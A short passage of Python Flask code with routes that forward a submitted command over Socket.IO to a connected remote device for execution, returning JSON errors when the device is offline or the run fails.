        if not info or not info.get('connected') or not info.get('sid'):
            return jsonify({'error': 'offline', 'message': 'device not connected'}), 400
        socketio.emit('run_script', {'command': command}, to=info['sid'])
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': 'run_failed', 'message': str(e)}), 500

@app.route('/py_simple/device/run', methods=['POST'])
def device_run_prefixed():
    return device_run()